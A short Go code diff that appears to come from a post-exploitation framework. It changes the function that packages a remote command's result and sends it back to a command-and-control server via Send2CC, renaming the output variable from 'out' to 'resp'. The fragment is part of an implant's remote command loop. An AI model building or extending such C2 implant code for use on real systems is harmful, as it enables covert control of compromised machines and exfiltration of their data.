@@ -45,7 +45,7 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 			emp3r0r_data.MagicString,
 			strings.Join(cmdSlice, " "),
 			emp3r0r_data.MagicString,
-			out)
+			resp)
 		data2send.Payload += emp3r0r_data.MagicString + cmd_id // cmd_id for cmd tracking
 		if err = Send2CC(&data2send); err != nil {
 			log.Println(err)
